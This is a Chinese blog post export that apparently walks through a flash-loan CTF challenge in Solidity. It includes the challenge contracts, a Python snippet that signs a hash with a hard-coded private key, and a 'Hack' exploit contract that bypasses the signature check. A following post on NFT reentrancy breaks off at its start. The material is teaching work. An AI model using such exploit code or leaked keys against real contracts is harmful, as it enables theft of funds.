&#125;</span><br><span class="line"></span><br><span class="line">    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, signature);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        return recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tryRecover(</span><br><span class="line">        bytes32 hash,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s</span><br><span class="line">    ) internal pure returns (address, RecoverError) &#123;</span><br><span class="line">        if (uint256(s) &gt; 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) &#123;</span><br><span class="line">            return (address(0), RecoverError.InvalidSignatureS);</span><br><span class="line">        &#125;</span><br><span class="line">        if (v != 27 &amp;&amp; v != 28) &#123;</span><br><span class="line">            return (address(0), RecoverError.InvalidSignatureV);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        address signer = ecrecover(hash, v, r, s);</span><br><span class="line">        if (signer == address(0)) &#123;</span><br><span class="line">            return (address(0), RecoverError.InvalidSignature);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return (signer, RecoverError.NoError);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function recover(</span><br><span class="line">        bytes32 hash,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s</span><br><span class="line">    ) internal pure returns (address) &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        return recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) &#123;</span><br><span class="line">        // 32 is the length in bytes of hash,</span><br><span class="line">        // enforced by the type signature above</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toEthSignedMessageHash(bytes memory s) internal pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n&quot;, StringsUpgradeable.toString(s.length), s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19\x01&quot;, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FlashLoanPriveder &#123;</span><br><span class="line">    IVault vault;</span><br><span class="line"></span><br><span class="line">    bytes32 public msgHash = 0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522;</span><br><span class="line">    bytes32 public r = 0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02;</span><br><span class="line">    bytes32 public s = 0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184;</span><br><span class="line">    uint8 public v = 0x1b;</span><br><span class="line"></span><br><span class="line">    address public flashLoanMain;</span><br><span class="line"></span><br><span class="line">    constructor (address vault_) &#123;</span><br><span class="line">        flashLoanMain = msg.sender;</span><br><span class="line">        vault = IVault(vault_); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        IFlashBorrower receiver,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory signature,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool)&#123;</span><br><span class="line">        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));</span><br><span class="line">        require(ECDSAUpgradeable.recover(msgHash,v,r,s) == ECDSAUpgradeable.recover(message, signature),&quot;Error signer!&quot;);</span><br><span class="line">        require(</span><br><span class="line">            amount &lt;= vault.cert().balanceOf(address(vault)),</span><br><span class="line">            &quot;AMOUNT_BIGGER_THAN_BALANCE&quot;</span><br><span class="line">        );//常规 : 借钱数量小于等于金库余额</span><br><span class="line">        //转钱</span><br><span class="line">        require(vault.transferToAccount(address(receiver), amount), &quot;FLASH_LENDER_TRANSFER_FAILED&quot;);</span><br><span class="line">        require(</span><br><span class="line">            //我们的合约receiver需要自己实现这个方法</span><br><span class="line">            //对我们借来的钱进行一系列操作</span><br><span class="line">            receiver.onFlashLoan(msg.sender, token, amount, data) == true,</span><br><span class="line">            &quot;FLASH_LENDER_CALLBACK_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            //最后还钱，因为是transferFrom，因此在onFlashLoan的时候需要进行approve</span><br><span class="line">            ICert(vault.cert()).transferFrom(</span><br><span class="line">                address(receiver),</span><br><span class="line">                address(vault),</span><br><span class="line">                amount</span><br><span class="line">            ),</span><br><span class="line">            &quot;FLASH_LENDER_REPAY_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMsgHash(IFlashBorrower receiver,address token,uint256 amount) public view returns(bytes32)&#123;</span><br><span class="line">        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Cert &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line">    address public flashLoanMain;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    constructor()public &#123;</span><br><span class="line">        flashLoanMain = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public &#123;</span><br><span class="line">        require(msg.sender==flashLoanMain,&quot;Forbidden!&quot;);</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;//ERC20接口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    ICert public cert;</span><br><span class="line">    address flashLoanPriveder;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    address public flashLoanMain;</span><br><span class="line">    uint256 internal constant RATIO_MULTIPLY_FACTOR = 10**6;</span><br><span class="line"></span><br><span class="line">    constructor (address cert_,uint amount) &#123;</span><br><span class="line">        flashLoanMain = msg.sender;</span><br><span class="line">        cert = ICert(cert_);</span><br><span class="line">        totalSupply += amount; </span><br><span class="line">        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();</span><br><span class="line">        balanceOf[msg.sender] = receivedETokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setPriveder(address flashLoanPriveder_)public &#123;</span><br><span class="line">        require(msg.sender==flashLoanMain,&quot;setPriveder Forbidden!&quot;);</span><br><span class="line">        flashLoanPriveder = flashLoanPriveder_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function join(uint256 amount) external&#123;</span><br><span class="line">        require(amount &gt; 0, &quot;CANNOT_STAKE_ZERO_TOKENS&quot;);</span><br><span class="line">        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();</span><br><span class="line">        totalSupply += receivedETokens;</span><br><span class="line">        balanceOf[msg.sender] += receivedETokens;</span><br><span class="line">        require(cert.transferFrom(msg.sender, address(this), amount),&quot;TRANSFER_STAKED_FAIL&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exit() external &#123;</span><br><span class="line">        uint256 amount = balanceOf[msg.sender];</span><br><span class="line">        uint256 stakedTokensToTransfer = amount * getRatio() / RATIO_MULTIPLY_FACTOR;</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        require(cert.transfer(msg.sender, stakedTokensToTransfer), &#x27;TRANSFER_STAKED_FAIL&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getRatio() public view returns(uint256)&#123;</span><br><span class="line">        if (totalSupply&gt; 0 &amp;&amp; cert.balanceOf(address(this)) &gt; 0) &#123;</span><br><span class="line">            return cert.balanceOf(address(this)) *RATIO_MULTIPLY_FACTOR / totalSupply;</span><br><span class="line">        &#125;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferToAccount(address account, uint256 amount) external returns(bool)&#123;</span><br><span class="line">        require(msg.sender==flashLoanPriveder,&quot;transferToAccount Forbidden!&quot;);</span><br><span class="line">        return cert.transfer(account, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FlashLoanMain &#123;</span><br><span class="line">    Vault public vault;</span><br><span class="line">    Cert public cert;</span><br><span class="line">    FlashLoanPriveder public flashLoanPriveder;</span><br><span class="line">    </span><br><span class="line">    bool public isAirdrop;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    </span><br><span class="line">    event sendflag(address user);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        cert = new Cert();//ERC20 token</span><br><span class="line">        vault = new Vault(address(cert),1000*10**18);//金库</span><br><span class="line">        cert.mint(address(vault),1000*10**18);</span><br><span class="line">        flashLoanPriveder = new FlashLoanPriveder(address(vault));</span><br><span class="line">        vault.setPriveder(address(flashLoanPriveder));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() public &#123;</span><br><span class="line">        require(!isAirdrop,&quot;Already get airdrop!&quot;);</span><br><span class="line">        cert.mint(msg.sender,100*10**18);</span><br><span class="line">        isAirdrop = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Complete()public returns(bool) &#123;</span><br><span class="line">        if (cert.balanceOf(msg.sender) &gt; 100*10**18)&#123;</span><br><span class="line">            isComplete = true;</span><br><span class="line">            emit sendflag(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        return isComplete;</span><br><span class="line">    &#125;//完成要求:攻击账户的cert代币数量超过10^20</span><br><span class="line">    //因此，我们可以利用闪电贷来完成</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目很长，我们先梳理一下题目大概讲了些什么：</p><ul><li>Cert是底层代币，类似ERC20</li><li>Vault是闪贷储存代币的金库，闪贷转账代币都是在这个合约转入转出</li><li>FlashLoanPriveder是提供了闪贷函数</li><li>FlashLoanMain是最外层暴露合约</li></ul><h3 id="1-主题目"><a href="#1-主题目" class="headerlink" title="1.主题目"></a>1.主题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">       cert = new Cert();//ERC20 token</span><br><span class="line">       vault = new Vault(address(cert),1000*10**18);//金库</span><br><span class="line">       cert.mint(address(vault),1000*10**18);</span><br><span class="line">       flashLoanPriveder = new FlashLoanPriveder(address(vault));</span><br><span class="line">       vault.setPriveder(address(flashLoanPriveder));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>意思是我们有一个ERC20代币cert，并且有一个金库vault用来存储cert这种ERCC20代币，并且这个金库拥有1000<em>10*</em>18个代币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function airdrop() public &#123;</span><br><span class="line">       require(!isAirdrop,&quot;Already get airdrop!&quot;);</span><br><span class="line">       cert.mint(msg.sender,100*10**18);</span><br><span class="line">       isAirdrop = true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">function Complete()public returns(bool) &#123;</span><br><span class="line">       if (cert.balanceOf(msg.sender) &gt; 100*10**18)&#123;</span><br><span class="line">           isComplete = true;</span><br><span class="line">           emit sendflag(msg.sender);</span><br><span class="line">       &#125;</span><br><span class="line">       return isComplete;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们完成题目，需要拥有超过<code>100*10**18</code>个代币，在airdrop()获取<code>100*10**18</code>个代币之后，我们再想办法获取至少1代币即可完成本道题。因此本题的的关键在于：如何获取更多的代币？</p><p>整体上看不难发现，这是一个有关闪电贷的题目，那么，我们就可以进行闪电贷获取一定金额，然后调用Complete()，就完成本题了</p><h3 id="2-闪电贷"><a href="#2-闪电贷" class="headerlink" title="2.闪电贷"></a>2.闪电贷</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        IFlashBorrower receiver,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory signature,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool)&#123;</span><br><span class="line">        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));</span><br><span class="line">        //非常规：</span><br><span class="line">        require(ECDSAUpgradeable.recover(msgHash,v,r,s) == ECDSAUpgradeable.recover(message, signature),&quot;Error signer!&quot;);</span><br><span class="line">        require(</span><br><span class="line">            amount &lt;= vault.cert().balanceOf(address(vault)),</span><br><span class="line">            &quot;AMOUNT_BIGGER_THAN_BALANCE&quot;</span><br><span class="line">        );//常规:借钱数量小于等于金库余额</span><br><span class="line">        //常规：转钱</span><br><span class="line">        require(vault.transferToAccount(address(receiver), amount), &quot;FLASH_LENDER_TRANSFER_FAILED&quot;);</span><br><span class="line">        require(</span><br><span class="line">            //常规:我们的合约receiver需要自己实现这个方法,对我们借来的钱进行一系列操作</span><br><span class="line">            receiver.onFlashLoan(msg.sender, token, amount, data) == true,</span><br><span class="line">            &quot;FLASH_LENDER_CALLBACK_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            //常规：最后还钱，因为是transferFrom，因此在onFlashLoan的时候需要进行approve</span><br><span class="line">            ICert(vault.cert()).transferFrom(</span><br><span class="line">                address(receiver),</span><br><span class="line">                address(vault),</span><br><span class="line">                amount</span><br><span class="line">            ),</span><br><span class="line">            &quot;FLASH_LENDER_REPAY_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是闪电贷的主函数：</p><p>代码中已经做了注释，5个require中4个是常规的闪电贷要求，其中有一个非常规的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));</span><br><span class="line">        //非常规：</span><br><span class="line">        require(ECDSAUpgradeable.recover(msgHash,v,r,s) == ECDSAUpgradeable.recover(message, signature),&quot;Error signer!&quot;);</span><br></pre></td></tr></table></figure><p>这个也是我们本道题的解题关键</p><h4 id="2-1左式"><a href="#2-1左式" class="headerlink" title="2.1左式"></a>2.1左式</h4><p>题目给出了信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bytes32 public msgHash = 0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522;</span><br><span class="line">    bytes32 public r = 0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02;</span><br><span class="line">    bytes32 public s = 0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184;</span><br><span class="line">    uint8 public v = 0x1b;</span><br></pre></td></tr></table></figure><p>将这些信息作为参数输入<code>ECDSAUpgradeable.recover(msgHash,v,r,s)</code>，可以得到签名人：0x001d3f1ef827552ae1114027bd3ecf1f086ba0f9。那么右式就需要用这个用户进行签名才可以通过。但是我们肯定是没有这个用户的私钥的，咋办啊？？？</p><p>很巧，这只是一个题目，这个用户的私钥是泄露的，很多教材都用过这个用户，在Google搜索一下(直接复制粘贴地址进行Google)就可以找到这个用户的私钥了，如图是我找到的：</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127202908079.png" alt="image-20230127202908079"></p><h4 id="2-2右式"><a href="#2-2右式" class="headerlink" title="2.2右式"></a>2.2右式</h4><p>有了这个用户的私钥，那么我们就可以对消息进行签名了：<code>ECDSAUpgradeable.recover(message, signature)</code>，意思是我们写一个消息message，然后进行签名成为signature，进行recover之后就返回signer，之后就通过require检查了</p><p>message的获取等价于这个合约里面的这个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getMsgHash(IFlashBorrower receiver,address token,uint256 amount) public view returns(bytes32)&#123;</span><br><span class="line">       bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));</span><br><span class="line">       return message;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>receiver：是我们的借款人的地址(borrow)，也就是Hack合约的地址</li><li>token：ERC20代币地址，也就是cert合约地址</li><li>amount：我们要借的钱数，只要不超过100<em>10*</em>18即可</li></ul><p>得到message之后，我们可以通过两个方法来进行签名：</p><p>1.使用web3.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line">messagehash = <span class="string">&quot;0x2380db06fa4a3e538cef9c8e3ec03cdfc9a975c3cf4cd96ab18b30fe15b63389&quot;</span></span><br><span class="line">privatekey =<span class="string">&quot;0xf8f8a2f43c8376ccb0871305060d7b27b0554d2cc72bccf41b2705608452f315&quot;</span></span><br><span class="line">signMessage = Account.signHash(message_hash=messagehash,private_key=privatekey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;signature =&quot;</span>,signMessage)</span><br></pre></td></tr></table></figure><p>2.使用Ethernaut环境</p><p>在下面“做题”环节展示</p><blockquote><p>PS：我一开始是使用web3js的，但是web3js签名的结果全是加上了以太坊前缀”\x19Ethereum Signed Message:\n32”。但是题目的环境中，是对签名messageHash进行签名的，而不是以太坊签名，因此web3js无法使用【题目中写的签名和解签是没有前缀的，不是第三方库的，可以去看library ECDSAUpgradeable】</p></blockquote><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>1.部署FlashLoanMain，得到cert、flashLoanProvider、vault的地址</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200056668.png" alt="image-20230127200056668"></p><p>2.将cert、flashLoanProvider、vault获取到</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200154047.png" alt="image-20230127200154047"></p><p>3.获取messageHash</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200355613.png" alt="image-20230127200355613"></p><p>4.进行签名：</p><p>4.1第一种签名的方法</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200804780.png" alt="image-20230127200804780"></p><p>4.2第二种签名的方法</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200646924.png" alt="image-20230127200646924"></p><p>5.我们发现require左边得出的signer和右边得出的signer是一致的</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127200908342.png" alt="image-20230127200908342"></p><p>6.发起攻击</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127201029497.png" alt="image-20230127201029497"></p><p>7.成功</p><p><img src="/2023/06/23/00.security/37.FlashLoanMain/image-20230127201101502.png" alt="image-20230127201101502"></p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    FlashLoanMain public flashLoanMain = FlashLoanMain(0xcD6a42782d230D7c13A74ddec5dD140e55499Df9);</span><br><span class="line">    FlashLoanPriveder public flashLoanPriveder = FlashLoanPriveder(0xdBB5D50e759576217088c1f7435A727897396373);</span><br><span class="line">    Cert public cert = Cert(0x633dBFB62C1Bd3d5fFf4D7d94E8c2f6f5B479ca1);</span><br><span class="line">    Vault public vault = Vault(0xB706b00ef5533D9d8283a3e938FcffafEc0F2866);</span><br><span class="line"></span><br><span class="line">    function recover(bytes32 hash,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s) public view returns(address)&#123;</span><br><span class="line">        return ECDSAUpgradeable.recover(hash,v,r,s);</span><br><span class="line">    &#125;//用来调试</span><br><span class="line"></span><br><span class="line">    function recover(bytes32 hash, bytes memory signature) public view returns(address)&#123;</span><br><span class="line">        return ECDSAUpgradeable.recover(hash,signature);</span><br><span class="line">    &#125;//用来调试</span><br><span class="line"></span><br><span class="line">    function attack(IFlashBorrower receiver,address token,uint256 amount,bytes calldata signature,</span><br><span class="line">    bytes calldata data) public&#123;</span><br><span class="line">        flashLoanMain.airdrop();</span><br><span class="line">        flashLoanPriveder.flashLoan(receiver, token, amount, signature, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool)&#123;</span><br><span class="line">        flashLoanMain.Complete();</span><br><span class="line">        cert.approve(address(flashLoanPriveder), amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>36.重入攻击_3</title>
      <link href="/2023/06/23/00.security/36.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_3/"/>
      <url>/2023/06/23/00.security/36.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_3/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击-3"><a href="#重入攻击-3" class="headerlink" title="重入攻击_3"></a>重入攻击_3</h1><p>这一讲，我们将介绍NFT合约的重入攻击漏洞，并攻击一个有漏洞的NFT合约，铸造100个NFT。</p><h2 id="NFT重入风险"><a href="#NFT重入风险" class="headerlink" title="NFT重入风险"></a>NFT重入风险</h2><p>我们在<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/S01_ReentrancyAttack/readme.md">S01 重入攻击</a>中讲过，重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如<code>fallback</code>函数）循环调用合约，将合约中资产转走或铸造大量代币。转账NFT时并不会触发合约的<code>fallback</code>或<code>receive</code>函数，为什么会有重入风险呢？</p><p>这是因为NFT标准（<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/34_ERC721/readme.md">ERC721</a>/<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/40_ERC1155/readme.md">ERC1155</a>）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 <code>ERC721</code> 的 <code>safeTransferFrom()</code> 函数会调用目标地址的 <code>onERC721Received()</code> 函数，而黑客可以把恶意代码嵌入其中进行攻击。</p><p>我们总结了 <code>ERC721</code> 和 <code>ERC1155</code> 有潜在重入风险的函数：</p><p><img src="/2023/06/23/00.security/36.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_3/S16-1.png" alt="img"></p><h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们学习一个有重入漏洞的NFT合约例子。这是一个<code>ERC721</code>合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。</p><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><p><code>NFTReentrancy</code>合约继承了<code>ERC721</code>合约，它主要有 <code>2</code> 个状态变量，<code>totalSupply</code>记录NFT的总供给，<code>mintedAddress</code>记录已铸造过的地址，防止一个用户多次铸造。它主要有 <code>2</code> 个函数：</p><ul><li>构造函数: 初始化 <code>ERC721</code> NFT的名称和代号。</li><li><code>mint()</code>: 